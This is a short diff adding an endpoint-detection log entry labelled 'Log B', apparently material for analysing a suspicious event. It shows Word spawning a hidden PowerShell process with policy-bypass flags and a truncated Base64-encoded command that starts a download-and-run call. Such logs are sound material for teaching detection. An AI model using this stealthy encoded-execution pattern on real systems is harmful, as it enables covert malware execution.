@@ -1,0 +1,6 @@
+로그 B
+2024-06-21 03:22:21 [EDR]
+Process: powershell.exe
+CmdLine: -NoP -NonI -W Hidden -Exec Bypass
+-Enc SQBFAFgAIAAoAE4AZQB3A...
+parent: WINWORD.EXE (PID 3201)
